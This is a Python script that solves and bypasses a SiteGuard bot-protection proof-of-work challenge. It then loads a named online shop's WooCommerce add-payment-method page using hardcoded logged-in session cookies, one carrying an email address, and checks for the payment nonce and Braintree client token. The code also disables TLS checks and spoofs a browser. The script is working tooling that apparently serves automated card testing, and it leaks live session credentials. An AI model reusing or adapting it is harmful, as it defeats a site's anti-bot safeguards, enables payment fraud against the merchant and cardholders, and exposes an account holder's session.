"""SiteGuard PoW solver v4 - correct variable-length counter encoding."""
import hashlib
import base64
import struct
import time
import random
import re
import requests

def _counter_to_bytes(c: int) -> bytes:
    """Convert counter to variable-length bytes (matching JavaScript)."""
    if c > 16777215:
        return struct.pack(">I", c)  # 4 bytes
    elif c > 65535:
        return struct.pack(">H", c >> 8) + bytes([c & 0xFF])  # 3 bytes
    elif c > 255:
        return struct.pack(">H", c)  # 2 bytes
    else:
        return bytes([c])  # 1 byte

def solve_siteguard_pow(challenge: str) -> tuple:
    """Solve PoW, return (sol_b64, elapsed_ms, total_hashes)."""
    parts = challenge.split(":")
    complexity = int(parts[0])
    challenge_bytes = challenge.encode("utf-8")
    start = random.randint(0, 5000000)
    shift = 32 - complexity
    
    t0 = time.time()
    for counter in range(start, start + 10000000):
        counter_bytes = _counter_to_bytes(counter)
        data = challenge_bytes + counter_bytes
        h = hashlib.sha1(data).digest()
        word0 = struct.unpack(">I", h[:4])[0]
        if (word0 >> shift) == 0:
            # Solution = Base64 of INPUT data (challenge + counter), NOT the hash
            sol = base64.b64encode(data).decode("ascii")
            elapsed_ms = int((time.time() - t0) * 1000)
            total_hashes = counter - start
            print(f"  [SITEGUARD] Solved PoW in {elapsed_ms/1000:.1f}s ({total_hashes} hashes, counter_bytes={len(counter_bytes)})")
            return sol, elapsed_ms, total_hashes
    
    return "", 0, 0

def bypass_siteguard(session: requests.Session, redirect_html: str, original_url: str) -> bool:
    m = re.search(r'content="0;([^"]+)"', redirect_html)
    if not m:
        return False
    redirect_url = m.group(1)
    base = original_url.split("/")[0] + "//" + original_url.split("/")[2]
    challenge_url = base + redirect_url if redirect_url.startswith("/") else redirect_url
    
    r = session.get(challenge_url, timeout=15)
    html = r.text
    
    ch_match = re.search(r'sgchallenge\s*=\s*"([^"]+)"', html)
    url_match = re.search(r'sgsubmit_url\s*=\s*"([^"]+)"', html)
    if not ch_match or not url_match:
        print(f"  [SITEGUARD] Challenge not found (size={len(html)})")
        return False
    
    challenge = ch_match.group(1)
    submit_url = url_match.group(1)
    
    sol, elapsed_ms, total_hashes = solve_siteguard_pow(challenge)
    if not sol:
        return False
    
    submit_full = base + submit_url if submit_url.startswith("/") else submit_url
    s_param = f"{elapsed_ms}:{total_hashes}"
    
    print(f"  [SITEGUARD] Submitting: sol={sol[:30]}... s={s_param}")
    r = session.get(submit_full, params={"sol": sol, "s": s_param}, timeout=15, allow_redirects=True)
    
    # Check cookies set by the solution
    sg_cookies = {ck.name: ck.value for ck in session.cookies}
    print(f"  [SITEGUARD] Cookies after solve: {list(sg_cookies.keys())}")
    
    if "sgcaptcha" not in r.text.lower() and "Robot Challenge" not in r.text:
        print(f"  [SITEGUARD] Bypassed! Status={r.status_code} Size={len(r.text)}")
        return True
    
    if r.url and "add-payment-method" in r.url and "sgcaptcha" not in r.url:
        print(f"  [SITEGUARD] Bypassed via redirect!")
        return True
    
    print(f"  [SITEGUARD] Still blocked: Status={r.status_code} Size={len(r.text)} URL={str(r.url)[:60]}")
    return False

def check_and_solve_siteguard(session: requests.Session, url: str, cookies: dict = None) -> requests.Response:
    r = session.get(url, cookies=cookies, timeout=20)
    if "sgcaptcha" in r.text:
        print("  [SITEGUARD] Challenge detected, solving...")
        if bypass_siteguard(session, r.text, url):
            r = session.get(url, cookies=cookies, timeout=20)
            if "sgcaptcha" not in r.text:
                print(f"  [SITEGUARD] Page loaded: Size={len(r.text)}")
                return r
    return r

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0"})
    cookies = {
        "wordpress_logged_in_2b7de3697c9435406398d1b992c801b2": "sagerwinter50%40gmail.com%7C1794784979%7C7ZXNtH7TIq9kZYMm5pO2uZJahwbfl6J53h2MFFMAX9D%7C56573655411bc75f5c2cbbce663cb661d7d3435aa3aaa57f6a0bf8c55a11c90c",
        "PHPSESSID": "912686b19b41f8328c89cfc2f71ad4d6",
    }
    url = "https://us.waxxxpress.com/my-account/add-payment-method/"
    r = check_and_solve_siteguard(s, url, cookies=cookies)
    print(f"\nFinal: Status={r.status_code} Size={len(r.text)}")
    print(f"Has nonce: {'woocommerce-add-payment-method-nonce' in r.text}")
    print(f"Has client_token: {'wc_braintree_client_token' in r.text}")